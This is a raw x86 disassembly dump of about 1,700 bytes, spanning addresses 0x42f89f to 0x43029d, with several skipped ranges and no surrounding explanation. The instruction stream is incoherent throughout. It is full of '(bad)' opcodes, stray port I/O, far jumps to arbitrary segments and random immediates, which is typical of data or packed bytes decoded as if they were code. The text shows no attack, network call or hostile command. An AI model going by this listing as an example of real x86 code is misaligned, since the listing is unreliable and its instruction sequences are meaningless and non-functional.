  42f89f:	fisub  WORD PTR [ecx]
  42f8a1:	mov    esi,0xc355c453
  42f8a6:	dec    esi
  42f8a7:	or     eax,0xdfcb94f7
  42f8ac:	int3   
  42f8ad:	ret    
  42f8ae:	scas   eax,DWORD PTR es:[edi]
  42f8af:	ins    BYTE PTR es:[edi],dx
  42f8b0:	leave  
  42f8b1:	push   0x5aba24fe
  42f8b6:	in     al,0x80
  42f8b8:	outs   dx,DWORD PTR ds:[esi]
  42f8b9:	loope  0x42f92b
  42f8bb:	push   edx
  42f8bc:	ss push es
  42f8be:	js     0x42f86b
  42f8c0:	jno    0x42f847
  42f8c2:	test   BYTE PTR [eax+0xb50fa9a],ch
  42f8c8:	mov    ss,WORD PTR [edx]
  42f8ca:	and    eax,0xec5992f3
  42f8cf:	cmp    DWORD PTR ds:0x97546f99,edi
  42f8d5:	outs   dx,DWORD PTR ds:[esi]
  42f8d6:	repnz mov ds:0x524a86d7,al
  42f8dc:	and    eax,0xa8fb7f6f
  42f8e1:	call   0xa12d93ce
  42f8e6:	mov    eax,ds:0x3972b536
  42f8eb:	sub    al,0x12
  42f8ed:	sbb    esp,0x69d33498
  42f8f3:	xor    esi,DWORD PTR [ebx-0x422c1717]
  42f8f9:	stos   DWORD PTR es:[edi],eax
  42f8fa:	cld    
  42f8fb:	jno    0x42f8a9
  42f8fd:	repz or ebx,ecx
  42f900:	pop    ebp
  42f901:	jge    0x42f8c9
  42f903:	push   0x15
  42f905:	push   ebp
  42f906:	mov    bh,0xc8
  42f908:	jne    0x42f973
  42f90a:	es scas al,BYTE PTR es:[edi]
  42f90c:	outs   dx,BYTE PTR ds:[esi]
  42f90d:	ins    DWORD PTR es:[edi],dx
  42f90e:	jge    0x42f8b2
	...
  42f974:	adc    al,0x74
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f99e
  42f981:	loop   0x42f99a
  42f983:	icebp  
  42f984:	js     0x42f983
  42f986:	add    DWORD PTR [eax],eax
  42f988:	add    al,0x1
  42f98a:	add    BYTE PTR [eax],al
  42f98c:	mov    WORD PTR [esi],cs
  42f98e:	or     ah,BYTE PTR [ebp-0x57]
  42f991:	outs   dx,DWORD PTR ds:[esi]
  42f992:	(bad)  [ebp+eax*1+0x824dc86]
  42f999:	or     cl,BYTE PTR [ebx-0x3c]
  42f99c:	cmp    DWORD PTR [ecx+0x5779f04e],ecx
  42f9a2:	aam    0xa5
  42f9a4:	and    al,0x15
  42f9a6:	xor    eax,0x10cec0ba
  42f9ab:	push   ss
  42f9ac:	mov    ecx,0xd971c52a
  42f9b1:	mov    bl,0x4e
  42f9b3:	(bad)  
  42f9b5:	daa    
  42f9b6:	nop
  42f9b7:	movd   esp,mm1
  42f9ba:	pop    es
  42f9bb:	and    ecx,DWORD PTR [edi+0x61e7d2ea]
  42f9c1:	ret    0xf58e
  42f9c4:	fisttp DWORD PTR [edi+0x45]
  42f9c7:	fsub   QWORD PTR [edi]
  42f9c9:	push   ss
  42f9ca:	scas   eax,DWORD PTR es:[edi]
  42f9cb:	das    
  42f9cc:	and    al,0x35
  42f9ce:	in     eax,dx
  42f9cf:	pop    edx
  42f9d0:	sti    
  42f9d1:	adc    al,0x4b
  42f9d3:	(bad)  
  42f9d5:	nop
  42f9d6:	mov    edi,0xdbb99876
  42f9db:	fwait
  42f9dc:	mov    esi,edx
  42f9de:	pop    esi
  42f9df:	outs   dx,BYTE PTR gs:[esi]
  42f9e1:	push   ebx
  42f9e2:	and    cl,ch
  42f9e4:	xor    bh,cl
  42f9e6:	es mov cl,0x80
  42f9e9:	jo     0x42fa54
  42f9eb:	xor    al,0x32
  42f9ed:	inc    esi
  42f9ee:	out    dx,al
  42f9ef:	push   edx
  42f9f0:	dec    ecx
  42f9f1:	jbe    0x42f9d1
  42f9f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f9f4:	jp     0x42f9d9
  42f9f6:	adc    BYTE PTR [ebx*4-0x91a3ee7],bl
  42f9fd:	call   0x3b71b98a
  42fa02:	rcl    DWORD PTR [bp+si],cl
  42fa05:	mov    edx,cs
  42fa07:	cmp    BYTE PTR [eax],al
  42fa09:	pop    esp
  42fa0a:	aaa    
  42fa0b:	imul   ecx,DWORD PTR [ecx],0x5211c044
  42fa11:	ror    BYTE PTR [ecx],0x47
  42fa14:	push   eax
  42fa15:	pop    es
  42fa16:	sbb    esi,0x4b762ea0
  42fa1c:	out    dx,eax
  42fa1d:	lds    ebp,FWORD PTR [ebx-0xf]
  42fa20:	jno    0x42fa74
  42fa22:	mov    dh,0x60
  42fa24:	jle    0x42fa0d
  42fa26:	loopne 0x42fa2c
  42fa28:	xor    al,0x7a
  42fa2a:	cld    
  42fa2b:	jnp    0x42f9ea
  42fa2d:	fisubr WORD PTR [edx]
  42fa2f:	inc    esi
  42fa30:	cmp    cl,ch
  42fa32:	sub    eax,ebp
  42fa34:	loopne 0x42f9fd
  42fa36:	mov    dl,0x47
  42fa38:	fimul  WORD PTR [ebp+0x7b74f709]
  42fa3e:	inc    esi
  42fa3f:	not    DWORD PTR [esi+0x37eff9d9]
  42fa45:	aaa    
  42fa46:	xchg   esi,eax
  42fa47:	outs   dx,DWORD PTR ds:[esi]
  42fa48:	push   eax
  42fa49:	in     eax,0xc0
  42fa4b:	cld    
  42fa4c:	cmp    al,0xd5
  42fa4e:	ror    BYTE PTR [esi],0x4d
  42fa51:	cmp    al,0xd4
  42fa53:	or     dh,0x39
  42fa56:	stos   BYTE PTR es:[edi],al
  42fa57:	cld    
  42fa58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fa59:	jge    0x42fa57
  42fa5b:	add    DWORD PTR [ecx],edi
  42fa5d:	or     DWORD PTR [ebx+ecx*2],edx
  42fa60:	push   eax
  42fa61:	out    0x67,eax
  42fa63:	sbb    al,0x42
  42fa65:	pop    eax
  42fa66:	js     0x42fabf
  42fa68:	jno    0x42fac8
  42fa6a:	and    DWORD PTR [edi+0x455d5cc3],ebp
  42fa70:	xor    eax,0xb498f51
  42fa75:	inc    ecx
  42fa76:	loope  0x42fa89
  42fa78:	ficomp DWORD PTR [ebx]
  42fa7a:	ffreep st(3)
  42fa7c:	push   eax
  42fa7d:	add    cl,BYTE PTR [esi+ebp*4+0x38]
  42fa81:	stos   BYTE PTR es:[edi],al
  42fa82:	lea    ecx,[edi-0x6e]
  42fa85:	lea    eax,[ebx]
  42fa87:	xchg   DWORD PTR [eax],eax
  42fa89:	popf   
  42fa8a:	inc    eax
  42fa8b:	mov    WORD PTR [ebx],gs
  42fa8d:	xchg   esp,eax
  42fa8e:	lock pushf 
	...
  42faf4:	sbb    ebp,edi
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	aas    
  42fb01:	jns    0x42fb53
  42fb03:	bnd jl 0x42fb04
  42fb06:	add    DWORD PTR [eax],eax
  42fb08:	add    al,0x1
  42fb0a:	add    BYTE PTR [eax],al
  42fb0c:	ss pushf 
  42fb0e:	(bad)  
  42fb0f:	out    0x4b,al
  42fb11:	shl    ecx,cl
  42fb13:	popf   
  42fb14:	sbb    dl,BYTE PTR [esi]
  42fb16:	daa    
  42fb17:	and    eax,0x586bf7e9
  42fb1c:	mov    eax,ds:0xff52f199
  42fb21:	repz pusha 
  42fb23:	xchg   ebx,eax
  42fb24:	adc    eax,0x6f55caf7
  42fb29:	jp     0x42fb5b
  42fb2b:	jmp    0xe09e:0x295a0c15
  42fb32:	retf   0xb4af
  42fb35:	sub    ah,bl
  42fb37:	pop    edi
  42fb38:	nop
  42fb39:	and    BYTE PTR [ecx+0x295f80a5],ah
  42fb3f:	out    dx,al
  42fb40:	mov    eax,0x5c444680
  42fb45:	sbb    esp,DWORD PTR [eax+0x4a]
  42fb48:	add    al,0x5b
  42fb4a:	dec    ecx
  42fb4b:	push   ds
  42fb4c:	call   0xdd56ec80
  42fb51:	dec    ebx
  42fb52:	test   BYTE PTR [ebx+edx*1+0x7a],al
  42fb56:	out    dx,eax
  42fb57:	(bad)  
  42fb58:	or     eax,DWORD PTR [ebx-0x46d5d0d9]
  42fb5e:	jb     0x42fb55
  42fb60:	scas   eax,DWORD PTR es:[edi]
  42fb61:	push   0x34
  42fb63:	jg     0x42fb14
  42fb65:	test   al,0x20
  42fb67:	dec    esi
  42fb68:	mov    al,0x3
  42fb6a:	inc    ebp
  42fb6b:	mov    ebx,DWORD PTR [esi]
  42fb6d:	sbb    BYTE PTR [ebx],dl
  42fb6f:	sub    eax,0x1469b09f
  42fb74:	rol    DWORD PTR [ebp-0x17],1
  42fb77:	in     al,0xfc
  42fb79:	outs   dx,DWORD PTR ds:[esi]
  42fb7a:	call   0x6f65c26b
  42fb7f:	push   ss
  42fb80:	shr    DWORD PTR [edi-0x2b],cl
  42fb83:	and    eax,0xe432d94d
  42fb88:	xchg   esp,eax
  42fb89:	and    eax,0xcc85817d
  42fb8e:	fdiv   DWORD PTR [edx]
  42fb90:	sub    eax,DWORD PTR [eax-0x7b]
  42fb93:	pop    edx
  42fb94:	fidivr DWORD PTR [ecx+ebp*2-0x2b0eaa41]
  42fb9b:	lahf   
  42fb9c:	mov    DWORD PTR [ebp-0x7679e52c],ebp
  42fba2:	rol    BYTE PTR [esi-0x423fa15f],cl
  42fba8:	xchg   esi,eax
  42fba9:	mul    DWORD PTR [ecx+0x1]
  42fbac:	cmc    
  42fbad:	sbb    eax,0xfbf855e1
  42fbb2:	sbb    al,0x61
  42fbb4:	mov    ch,0x3
  42fbb6:	in     al,dx
  42fbb7:	mov    al,ds:0x7700cc4b
  42fbbc:	push   0x73
  42fbbe:	fmul   QWORD PTR [edx-0x51]
  42fbc1:	into   
  42fbc2:	mov    BYTE PTR [eax-0x22],0x6d
  42fbc6:	idiv   BYTE PTR [eax+0x2d]
  42fbc9:	and    DWORD PTR [eax+0x5f],edx
  42fbcc:	mov    BYTE PTR [ebx-0x7f230239],ah
  42fbd2:	xor    BYTE PTR [esi+ebp*2+0x22a37ada],cl
  42fbd9:	inc    ebp
  42fbda:	cmc    
  42fbdb:	or     al,0x89
  42fbdd:	xchg   esp,eax
  42fbde:	and    BYTE PTR [edi-0x2a],al
  42fbe1:	rol    cl,cl
  42fbe3:	mov    dl,0x35
  42fbe5:	rol    esp,0xfb
  42fbe8:	nop
  42fbe9:	push   ebp
  42fbea:	std    
  42fbeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fbec:	push   es
  42fbed:	cmp    eax,0xa443c792
  42fbf2:	test   eax,0x2f25f163
  42fbf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fbf8:	sbb    al,0x1f
  42fbfa:	frstor [ecx]
  42fbfc:	shr    BYTE PTR [edx+0x4f6ad2ec],cl
  42fc02:	popa   
  42fc03:	xchg   edx,eax
  42fc04:	fwait
  42fc05:	xor    bh,BYTE PTR [eax+0x1201c364]
  42fc0b:	test   DWORD PTR [edx+0x79ef93],0x0
	...
  42fc71:	add    BYTE PTR [eax],al
  42fc73:	add    BYTE PTR [ebx],cl
  42fc75:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc7b:	call   0x53cf:0x2036325e
  42fc82:	int3   
  42fc83:	or     eax,0x1ff80
  42fc88:	add    al,0x1
  42fc8a:	add    BYTE PTR [eax],al
  42fc8c:	mov    fs,esp
  42fc8e:	mov    eax,0x9af39722
  42fc93:	pop    edi
  42fc94:	sub    bh,ah
  42fc96:	aad    0x51
  42fc98:	mov    ds:0xfc206af2,eax
  42fc9d:	cmc    
  42fc9e:	mov    fs,WORD PTR [ecx+ecx*1]
  42fca1:	arpl   WORD PTR [esi+ebp*1-0x65],bp
  42fca5:	sbb    eax,0xea1b9ca8
  42fcaa:	repz xor eax,0x8dcae449
  42fcb0:	push   eax
  42fcb1:	pop    es
  42fcb2:	sbb    al,0x40
  42fcb4:	test   DWORD PTR [esi],ecx
  42fcb6:	mov    eax,ds:0x55e94071
  42fcbb:	inc    BYTE PTR [esi+ecx*2-0x5f]
  42fcbf:	dec    eax
  42fcc0:	inc    esi
  42fcc1:	sbb    BYTE PTR [ecx+edi*8-0x6dd45c3],0xf8
  42fcc9:	mov    dh,ch
  42fccb:	xchg   esp,eax
  42fccc:	push   eax
  42fccd:	mov    cl,0xb0
  42fccf:	xor    DWORD PTR [eax+ecx*1+0x4c248918],edx
  42fcd6:	inc    eax
  42fcd7:	popa   
  42fcd8:	push   cs
  42fcd9:	lock mov bh,0xa1
  42fcdc:	hlt    
  42fcdd:	cwde   
  42fcde:	xlat   BYTE PTR ds:[ebx]
  42fcdf:	xlat   BYTE PTR ds:[ebx]
  42fce0:	push   ebx
  42fce1:	xor    eax,0xa2005fd3
  42fce6:	mov    ebp,?
  42fce8:	pop    edx
  42fce9:	inc    ebp
  42fcea:	out    0xab,eax
  42fcec:	mov    eax,DWORD PTR [edi+0x6a]
  42fcef:	shl    BYTE PTR [ebx+ecx*4+0x1],0xc7
  42fcf4:	pop    esi
  42fcf5:	pushf  
  42fcf6:	or     bl,BYTE PTR [edx-0x6f]
  42fcf9:	mov    DWORD PTR [eax],ecx
  42fcfb:	in     al,dx
  42fcfc:	xrelease xchg BYTE PTR [ebx],dh
  42fcff:	and    eax,0x68925316
  42fd04:	lods   al,BYTE PTR ds:[esi]
  42fd05:	push   ebx
  42fd06:	push   ebx
  42fd07:	test   eax,0x37f5b25a
  42fd0c:	sbb    al,BYTE PTR ds:0x77f0597
  42fd12:	(bad)  
  42fd13:	dec    ebp
  42fd14:	pop    ds
  42fd15:	mov    dl,0x1e
  42fd17:	int    0x45
  42fd19:	and    bl,BYTE PTR [edi+0x38ffad10]
  42fd1f:	cdq    
  42fd20:	push   ecx
  42fd21:	in     al,dx
  42fd22:	call   0xefcb:0xb2452de9
  42fd29:	pushf  
  42fd2a:	test   BYTE PTR [edi],al
  42fd2c:	pushf  
  42fd2d:	pop    ss
  42fd2e:	push   esp
  42fd2f:	shl    DWORD PTR [esi+0x5401c107],1
  42fd35:	call   0x8a893ab5
  42fd3a:	sub    dl,BYTE PTR [ebx]
  42fd3c:	ins    DWORD PTR es:[edi],dx
  42fd3d:	mov    dh,0xd
  42fd3f:	cmp    al,0xee
  42fd41:	popa   
  42fd42:	mov    ah,0xee
  42fd44:	fwait
  42fd45:	(bad)  
  42fd46:	cld    
  42fd47:	mov    eax,0x7f2adf60
  42fd4c:	xchg   ebx,eax
  42fd4d:	(bad)  
  42fd4e:	(bad)  
  42fd4f:	mov    ah,0x38
  42fd51:	iret   
  42fd52:	adc    ecx,eax
  42fd54:	out    dx,al
  42fd55:	mov    bh,0x28
  42fd57:	popa   
  42fd58:	and    ebx,esi
  42fd5a:	mov    cs,WORD PTR [esi]
  42fd5c:	repnz xchg esp,eax
  42fd5e:	jecxz  0x42fddc
  42fd60:	cmp    edx,edx
  42fd62:	out    0xa6,eax
  42fd64:	add    DWORD PTR [eax-0x2f],0xa01a897e
  42fd6b:	push   esp
  42fd6c:	xchg   DWORD PTR [edx],edi
  42fd6e:	shr    DWORD PTR [edi+0x1da4b9bd],1
  42fd74:	aas    
  42fd75:	push   ds
  42fd76:	jmp    0x303e:0x441696db
  42fd7d:	inc    ecx
  42fd7e:	pop    ebp
  42fd7f:	aas    
  42fd80:	or     eax,0xdfbabd96
  42fd85:	jg     0x42fd40
  42fd87:	shl    BYTE PTR ds:0x88b434bb,0x1
  42fd8e:	jbe    0x42fd4b
	...
  42fdf4:	dec    eax
  42fdf5:	rol    dl,0xf0
  42fdf8:	retf   0x7af2
  42fdfb:	clc    
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz fmul DWORD PTR ds:0x84732a
  42fe06:	add    al,BYTE PTR [eax]
  42fe08:	add    al,0x1
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	xchg   DWORD PTR ds:0xe1ac70c9,ebx
  42fe12:	out    0x3e,al
  42fe14:	sbb    bx,cx
  42fe17:	jmp    0x42fdc3
  42fe19:	pop    es
  42fe1a:	scas   al,BYTE PTR es:[edi]
  42fe1b:	std    
  42fe1c:	dec    ecx
  42fe1d:	ss dec esi
  42fe1f:	outs   dx,DWORD PTR ds:[esi]
  42fe20:	mov    bl,0xff
  42fe22:	in     al,0xc6
  42fe24:	pop    ebp
  42fe25:	(bad)  
  42fe26:	call   0x2c95:0x56a57e0
  42fe2d:	stos   BYTE PTR es:[edi],al
  42fe2e:	push   ss
  42fe2f:	sub    cl,BYTE PTR [ebx]
  42fe31:	cli    
  42fe32:	xchg   edi,eax
  42fe33:	scas   eax,DWORD PTR es:[edi]
  42fe34:	mov    al,0x5d
  42fe36:	push   ecx
  42fe37:	xchg   BYTE PTR [ecx-0x5777e404],al
  42fe3d:	loopne 0x42fe7b
  42fe3f:	push   eax
  42fe40:	jge    0x42fe17
  42fe42:	cmp    ebp,esp
  42fe44:	aad    0xa8
  42fe46:	inc    ebx
  42fe47:	js     0x42fdcc
  42fe49:	pop    esi
  42fe4a:	or     DWORD PTR [esi-0x3d],ebp
  42fe4d:	xchg   edx,eax
  42fe4e:	stc    
  42fe4f:	xor    BYTE PTR [ebx],0x13
  42fe52:	clc    
  42fe53:	mov    BYTE PTR es:[edx*2-0x2cde4a66],dh
  42fe5b:	shl    DWORD PTR [ebx],0x59
  42fe5e:	add    DWORD PTR [edi],ecx
  42fe60:	enter  0xe29d,0x79
  42fe64:	ins    BYTE PTR es:[edi],dx
  42fe65:	fistp  WORD PTR es:[esi]
  42fe68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fe69:	(bad)  
  42fe6a:	jbe    0x42feba
  42fe6c:	loopne 0x42feb8
  42fe6e:	push   esi
  42fe6f:	fadd   DWORD PTR [edx-0xf]
  42fe72:	xlat   BYTE PTR ds:[ebx]
  42fe73:	loopne 0x42fdf5
  42fe75:	push   ecx
  42fe76:	dec    edx
  42fe77:	pop    edi
  42fe78:	pop    eax
  42fe79:	cwde   
  42fe7a:	mov    bh,BYTE PTR [eax+0x155ae6cc]
  42fe80:	jge    0x42fed9
  42fe82:	sbb    BYTE PTR ds:0x651debcb,bh
  42fe88:	and    DWORD PTR [edi],0x18d92590
  42fe8e:	(bad)  [ebx+esi*2-0x70944306]
  42fe95:	push   esp
  42fe96:	mov    eax,esp
  42fe98:	add    esp,0x21
  42fe9b:	sub    al,0x89
  42fe9d:	repnz pop edx
  42fe9f:	les    edx,FWORD PTR [eax-0x1]
  42fea2:	ds xchg ecx,eax
  42fea4:	retf   
  42fea5:	xor    esi,edi
  42fea7:	imul   edx,DWORD PTR [ebx-0x18],0x656b8367
  42feae:	arpl   WORD PTR [edx-0x74],si
  42feb1:	inc    edi
  42feb2:	mov    ch,0x63
  42feb4:	mov    edi,0x48786089
  42feb9:	xchg   ebp,eax
  42feba:	mov    esp,0x43f42424
  42febf:	js     0x42fecc
  42fec1:	ror    eax,cl
  42fec3:	jp     0x42fe9b
  42fec5:	push   ebx
  42fec6:	popf   
  42fec7:	push   0xffffffac
  42fec9:	and    eax,0xa2eab165
  42fece:	adc    edx,ebp
  42fed0:	(bad)  
  42fed1:	test   al,0x8a
  42fed3:	fdiv   QWORD PTR [eax]
  42fed5:	mov    eax,ds:0x8c7dcbde
  42feda:	push   ss
  42fedb:	repz icebp 
  42fedd:	dec    esp
  42fede:	mov    edi,0x9dd8023d
  42fee3:	nop
  42fee4:	fwait
  42fee5:	stos   DWORD PTR es:[edi],eax
  42fee6:	inc    esp
  42fee7:	dec    eax
  42fee8:	lahf   
  42fee9:	in     al,0x6f
  42feeb:	mov    edx,0xe49731d2
  42fef0:	mov    bh,0x77
  42fef2:	mov    es,WORD PTR ss:[edi+0x3a]
  42fef6:	xor    edi,edi
  42fef8:	je     0x42feed
  42fefa:	mov    cl,0xef
  42fefc:	adc    BYTE PTR [esi-0x7f],bh
  42feff:	outs   dx,BYTE PTR ds:[esi]
  42ff00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ff01:	mov    ah,0xe4
  42ff03:	dec    edi
  42ff04:	pop    ebx
  42ff05:	lods   al,BYTE PTR ss:[esi]
  42ff07:	xor    cl,0x18
  42ff0a:	dec    eax
  42ff0c:	cs dec esp
  42ff0e:	dec    esp
  42ff0f:	stos   DWORD PTR es:[edi],eax
	...
  42ff74:	add    al,0x67
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [ebx+ebx*2+0x24],0xb6
  42ff83:	stos   DWORD PTR es:[edi],eax
  42ff84:	mov    BYTE PTR [ecx],al
  42ff86:	add    al,BYTE PTR [eax]
  42ff88:	add    al,0x1
  42ff8a:	add    BYTE PTR [eax],al
  42ff8c:	ret    0xaa48
  42ff8f:	arpl   WORD PTR [edx-0x77576e9],bx
  42ff95:	sub    DWORD PTR [eax+0x4a],ecx
  42ff98:	shr    DWORD PTR [edi-0x2184c2e7],0x38
  42ff9f:	sbb    dl,BYTE PTR [esi]
  42ffa1:	push   esi
  42ffa2:	data16 mov ds:0xd0ea4072,al
  42ffa8:	test   DWORD PTR [ebx+edx*8-0x6d],ebx
  42ffac:	test   edx,ebp
  42ffae:	rol    ebx,cl
  42ffb0:	into   
  42ffb1:	push   edi
  42ffb2:	pop    ecx
  42ffb3:	fcmovnu st,st(1)
  42ffb5:	jge    0x42ffd0
  42ffb7:	xor    eax,0x59345c86
  42ffbc:	or     al,0xd0
  42ffbe:	inc    ebp
  42ffbf:	jmp    0xa81e58d9
  42ffc4:	cmp    eax,0x3aa0f481
  42ffc9:	xor    al,BYTE PTR [edi+0x346c30d3]
  42ffcf:	inc    ebx
  42ffd0:	pop    ebp
  42ffd1:	imul   BYTE PTR [esi+0x64]
  42ffd4:	int3   
  42ffd5:	mov    DWORD PTR [edx-0x1d],edx
  42ffd8:	pop    esi
  42ffd9:	push   ss
  42ffda:	out    0xf7,eax
  42ffdc:	ja     0x42ffd0
  42ffde:	into   
  42ffdf:	inc    ecx
  42ffe0:	repnz inc esp
  42ffe2:	mov    eax,ds:0xd1520f36
  42ffe7:	inc    ebx
  42ffe8:	aaa    
  42ffe9:	test   BYTE PTR [eax*4-0x2fa092ec],ah
  42fff0:	mov    DWORD PTR [edi+0x60],esp
  42fff3:	out    0xdd,eax
  42fff5:	pop    es
  42fff6:	loop   0x43003f
  42fff8:	adc    ebp,DWORD PTR [ecx-0x7d]
  42fffb:	into   
  42fffc:	stc    
  42fffd:	imul   ebx,DWORD PTR [esi],0xffffffb8
  430000:	inc    edi
  430001:	xor    ah,bh
  430003:	retf   0x13e8
  430006:	pop    ecx
  430007:	aas    
  430008:	(bad)  
  430009:	test   al,0xee
  43000b:	out    dx,eax
  43000c:	cmp    ch,BYTE PTR [esi]
  43000e:	test   BYTE PTR [ebx+0x17],bh
  430011:	dec    eax
  430012:	mov    ah,0xab
  430014:	inc    eax
  430015:	pop    ebx
  430016:	out    dx,eax
  430017:	sub    dl,al
  430019:	call   0x2b8c:0xc7b30ab8
  430020:	aaa    
  430021:	adc    BYTE PTR [edi],ah
  430023:	xchg   DWORD PTR [edx],edi
  430025:	or     ch,BYTE PTR [esi-0x2487dc7e]
  43002b:	inc    ebx
  43002c:	jo     0x430074
  43002e:	(bad)
  430031:	test   DWORD PTR [ebx+0x1feb987a],ecx
  430037:	repnz shl DWORD PTR [eax-0x4bd115c7],1
  43003e:	xchg   ecx,eax
  43003f:	xor    DWORD PTR [edi+esi*4],ebx
  430042:	scas   al,BYTE PTR es:[edi]
  430043:	and    DWORD PTR ds:0x6de85d1e,0x63
  43004a:	dec    edx
  43004b:	aad    0x5b
  43004d:	sub    al,BYTE PTR [edi+0x1c66a72f]
  430053:	shr    BYTE PTR [esi-0x5538954b],0xec
  43005a:	bswap  edx
  43005c:	mov    ds:0x1676ddad,al
  430061:	xchg   ebx,eax
  430062:	test   BYTE PTR [ecx],dh
  430064:	adc    al,0x22
  430066:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430067:	jl     0x4300a0
  430069:	les    eax,FWORD PTR [ecx+edx*2+0x380adace]
  430070:	mov    eax,ds:0x121baaf0
  430075:	jne    0x430009
  430077:	retf   0x4635
  43007a:	mov    edx,0x98136d2e
  43007f:	or     edi,DWORD PTR [eax]
  430081:	ins    DWORD PTR es:[edi],dx
  430082:	enter  0x94f1,0xb9
  430086:	push   eax
  430087:	mov    ds:0x8a5dc352,al
  43008c:	sti    
  43008d:	lods   eax,DWORD PTR ds:[esi]
  43008e:	sbb    DWORD PTR [ebp+0x0],ebx
	...
  4300f4:	(bad)  
  4300f5:	ins    DWORD PTR es:[edi],dx
  4300f6:	aam    0xb5
  4300f8:	(bad)  
  4300f9:	mov    ebp,0x9547fe7
  4300fe:	scas   eax,DWORD PTR es:[edi]
  4300ff:	add    al,0xef
  430101:	fsubr  DWORD PTR [ebp-0x60]
  430104:	mov    WORD PTR [edx],es
  430106:	add    al,BYTE PTR [eax]
  430108:	add    DWORD PTR [eax],0x5b370000
  43010e:	repz cmp ebx,DWORD PTR [edi+0x5a]
  430112:	or     al,0x2a
  430114:	out    dx,al
  430115:	mov    bh,0x1a
  430117:	mov    al,ds:0xf7528384
  43011c:	lods   eax,DWORD PTR ds:[esi]
  43011d:	push   edx
  43011e:	xor    dh,bh
  430120:	push   ss
  430121:	dec    edi
  430122:	adc    esp,DWORD PTR [ebp-0x49]
  430125:	sar    BYTE PTR [edx+eax*1+0x18],0x5b
  43012a:	mov    al,0xc3
  43012c:	cmc    
  43012d:	(bad)  
  43012e:	bound  eax,QWORD PTR [esi]
  430130:	mov    ds:0x11cc129,eax
  430135:	sar    edi,1
  430137:	add    cl,BYTE PTR [edx-0x2b]
  43013a:	xchg   ebx,eax
  43013b:	pop    es
  43013c:	mov    bl,0x80
  43013e:	adc    BYTE PTR [ebp+0x3e],bh
  430141:	stos   DWORD PTR es:[edi],eax
  430142:	push   ecx
  430143:	xchg   edx,eax
  430144:	lea    esp,[ebx]
  430146:	pop    ebp
  430147:	dec    esi
  430148:	je     0x43016e
  43014a:	sbb    eax,0x7d0da86d
  43014f:	sbb    edx,edx
  430151:	or     DWORD PTR [ecx+ebp*2+0x6472c526],eax
  430158:	inc    ebx
  430159:	sbb    DWORD PTR [edi-0xfb8a2ec],eax
  43015f:	shl    ecx,1
  430161:	push   ebp
  430162:	out    0x25,al
  430164:	mov    esp,ebx
  430166:	(bad)  
  430167:	jmp    0xf2de:0x9df21d2d
  43016e:	inc    ebp
  43016f:	aas    
  430170:	aas    
  430171:	cmc    
  430172:	cmc    
  430173:	xchg   ebx,eax
  430174:	dec    ebp
  430175:	scas   al,BYTE PTR es:[edi]
  430176:	pop    ecx
  430177:	cdq    
  430178:	mov    eax,0x6d3d450a
  43017d:	popf   
  43017e:	mov    ds:0xe4ce9dc5,al
  430183:	dec    ebx
  430184:	(bad)  
  430185:	push   ecx
  430186:	int    0x90
  430188:	das    
  430189:	xchg   edx,eax
  43018a:	add    al,0xe6
  43018c:	mov    DWORD PTR [eax],0x0
	...
  4301f2:	add    BYTE PTR [eax],al
  4301f4:	dec    ebp
  4301f5:	push   ebp
  4301f6:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  4301fc:	mov    esp,ebp
  4301fe:	or     ah,dh
  430200:	dec    ebp
  430201:	add    bh,al
  430203:	add    BYTE PTR [eax],cl
  430205:	add    BYTE PTR [eax],al
  430207:	mov    DWORD PTR [eax],0x40f44545
  43020d:	xor    DWORD PTR [eax],eax
  43020f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430215:	(bad)  
  430216:	enter  0x4d45,0xbc
  43021a:	mov    esi,DWORD PTR [edx]
  43021c:	hlt    
  43021d:	test   ebx,ecx
  43021f:	pushf  
  430220:	enter  0x4df8,0x8b
  430224:	mov    DWORD PTR [ebp+0x8],0x894708
  43022b:	inc    ebp
  43022c:	mov    ebp,0xff8bfffc
  430231:	dec    ebp
  430232:	mov    ch,0xf4
  430234:	call   DWORD PTR [ebx-0x1]
  430237:	mov    ebx,0x8005474
  43023c:	call   DWORD PTR [ecx+0x8]
  43023f:	pop    es
  430240:	jmp    0xb8:0xacb4533
  430247:	fwait
  430248:	mov    esi,DWORD PTR [edx-0xc]
  43024b:	xor    cl,bl
  43024d:	add    BYTE PTR [ebx+0x3c83203],bl
  430253:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  430259:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  43025f:	xor    eax,DWORD PTR [eax]
  430261:	retf   
  430262:	retf   
  430263:	add    ecx,eax
  430265:	enter  0x894d,0x64
  430269:	dec    ebp
  43026a:	sbb    ah,cl
  43026c:	add    BYTE PTR [ebx-0xb9bb277],cl
  430272:	dec    DWORD PTR [ebx-0xbcfb275]
  430278:	test   DWORD PTR [ebx],esi
  43027a:	dec    ebx
  43027c:	inc    DWORD PTR [ebx]
  43027e:	inc    eax
  43027f:	enter  0x8989,0x50
  430283:	(bad)  
  430284:	call   DWORD PTR [ebx+ecx*4-0x1]
  430288:	cld    
  430289:	dec    DWORD PTR [ebp-0xa90001]
  43028f:	push   edi
  430290:	mov    BYTE PTR [edx+0x1],ch
  430293:	and    al,BYTE PTR [eax]
  430295:	pop    ecx
  430296:	inc    ebp
  430297:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43029d:	push   0xffffff89
